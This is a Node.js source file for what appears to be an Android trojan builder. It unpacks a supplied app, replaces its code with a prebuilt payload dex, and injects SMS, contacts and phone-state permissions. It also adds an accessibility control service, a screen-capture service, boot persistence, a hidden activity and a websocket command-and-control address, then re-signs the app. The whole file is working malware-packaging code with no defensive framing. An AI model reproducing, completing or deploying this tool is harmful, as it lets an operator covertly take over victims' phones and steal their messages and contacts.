const { execFile } = require('child_process');
const fs = require('fs');
const path = require('path');
const { promisify } = require('util');
const run = promisify(execFile);
const db = require('./db');

const APK_DIR = process.env.APK_DIR || path.join(__dirname, '..', 'apks');
const DEX = path.join(__dirname, '..', 'payload', 'build', 'classes.dex');
const MAXBUF = 1 << 26;
const TIMEOUT = 300000;

const PERMS = [
  'android.permission.INTERNET',
  'android.permission.ACCESS_NETWORK_STATE',
  'android.permission.ACCESS_WIFI_STATE',
  'android.permission.FOREGROUND_SERVICE',
  'android.permission.FOREGROUND_SERVICE_DATA_SYNC',
  'android.permission.POST_NOTIFICATIONS',
  'android.permission.RECEIVE_BOOT_COMPLETED',
  'android.permission.WAKE_LOCK',
  'android.permission.READ_PHONE_STATE',
  'android.permission.QUERY_ALL_PACKAGES',
  'android.permission.READ_SMS',
  'android.permission.READ_CONTACTS'
];

const COMPONENTS = (pkg) => `
  <service android:name="com.arpit.access.AgentService" android:exported="false" android:foregroundServiceType="mediaProjection" />
  <service android:name="com.arpit.access.TouchService" android:exported="true" android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
    <intent-filter><action android:name="android.accessibilityservice.AccessibilityService" /></intent-filter>
    <meta-data android:name="android.accessibilityservice" android:resource="@xml/arpit_accessibility" />
  </service>
  <receiver android:name="com.arpit.access.BootReceiver" android:exported="true">
    <intent-filter>
      <action android:name="android.intent.action.BOOT_COMPLETED" />
      <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
      <action android:name="android.intent.action.QUICKBOOT_POWERON" />
      <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
    </intent-filter>
  </receiver>
  <activity android:name="com.arpit.access.ConnectActivity" android:exported="false"
            android:theme="@android:style/Theme.Translucent.NoTitleBar"
            android:excludeFromRecents="true" android:launchMode="singleTask" />
  <provider android:name="com.arpit.access.BootProvider"
            android:authorities="${pkg}.arpitboot"
            android:exported="false" android:initOrder="1000" />
`;

function patchManifest(xml, pkg) {
  const perms = PERMS.map((p) => `  <uses-permission android:name="${p}" />`).join('\n');
  xml = xml.replace(/<application/, perms + '\n  <application');
  xml = xml.replace(/<\/application>/, COMPONENTS(pkg) + '\n</application>');
  return xml;
}

function wsUrl(buildId, secret) {
  const base = (process.env.BASE_URL || '').replace(/\/+$/, '');
  if (!base) throw new Error('BASE_URL set nahi hai');
  return `${base.replace(/^http/, 'ws')}/agent?b=${buildId}&k=${secret}`;
}

const tool = (name) => path.join(process.env.BUILD_TOOLS || '/usr/bin', name);

async function build({ buildId, inputApk, name }) {
  const work = path.join('/tmp', 'arpit-build', buildId);
  const src = path.join(work, 'src');
  const out = path.join(work, 'unsigned.apk');
  const aligned = path.join(work, 'aligned.apk');
  const finalApk = path.join(APK_DIR, `${buildId}.apk`);

  try {
    if (!fs.existsSync(DEX)) throw new Error('payload/build/classes.dex missing');
    if (!process.env.KEYSTORE || !fs.existsSync(process.env.KEYSTORE)) throw new Error('keystore missing: ' + process.env.KEYSTORE);
    if (!process.env.BUILD_TOOLS) throw new Error('BUILD_TOOLS set nahi hai');

    fs.mkdirSync(APK_DIR, { recursive: true });
    fs.mkdirSync(work, { recursive: true });

    await run('apktool', ['d', '-f', '--use-aapt2', '-o', src, inputApk], { maxBuffer: MAXBUF, timeout: TIMEOUT });

    const manifestPath = path.join(src, 'AndroidManifest.xml');
    const xml = fs.readFileSync(manifestPath, 'utf8');
    const pm = xml.match(/package="([^"]+)"/);
    if (!pm) throw new Error('AndroidManifest me package name nahi mila');
    const pkg = pm[1];
    const label = (xml.match(/android:label="([^"]*)"/) || [])[1] || name;

    fs.copyFileSync(DEX, path.join(src, 'classes.dex'));

    const resXml = path.join(src, 'res', 'xml');
    fs.mkdirSync(resXml, { recursive: true });
    fs.copyFileSync(
      path.join(__dirname, '..', 'payload', 'res', 'xml', 'arpit_accessibility.xml'),
      path.join(resXml, 'arpit_accessibility.xml')
    );

    const assets = path.join(src, 'assets');
    fs.mkdirSync(assets, { recursive: true });

    const b = db.prepare('SELECT secret FROM builds WHERE id=?').get(buildId);
    fs.writeFileSync(path.join(assets, 'arpit.json'), JSON.stringify({
      url: wsUrl(buildId, b.secret),
      id: buildId
    }));

    fs.writeFileSync(manifestPath, patchManifest(xml, pkg));
    db.prepare('UPDATE builds SET pkg=?, label=? WHERE id=?').run(pkg, label, buildId);

    await run('apktool', ['b', src, '-o', out], { maxBuffer: MAXBUF, timeout: TIMEOUT });
    await run(tool('zipalign'), ['-f', '4', out, aligned], { maxBuffer: MAXBUF, timeout: 60000 });
    await run(tool('apksigner'), [
      'sign',
      '--ks', process.env.KEYSTORE,
      '--ks-pass', `pass:${process.env.KS_PASS}`,
      '--ks-key-alias', process.env.KS_ALIAS,
      '--out', finalApk, aligned
    ], { maxBuffer: MAXBUF, timeout: 120000 });

    db.prepare("UPDATE builds SET status='ready', size=? WHERE id=?")
      .run(fs.statSync(finalApk).size, buildId);
  } catch (e) {
    const msg = (e && (e.stderr || e.message)) || 'unknown';
    try {
      db.prepare("UPDATE builds SET status='failed', err=? WHERE id=?")
        .run(String(msg).slice(-2000), buildId);
    } catch {}
  } finally {
    fs.rm(work, { recursive: true, force: true }, () => {});
    fs.rm(inputApk, { force: true }, () => {});
  }
}

module.exports = { build };
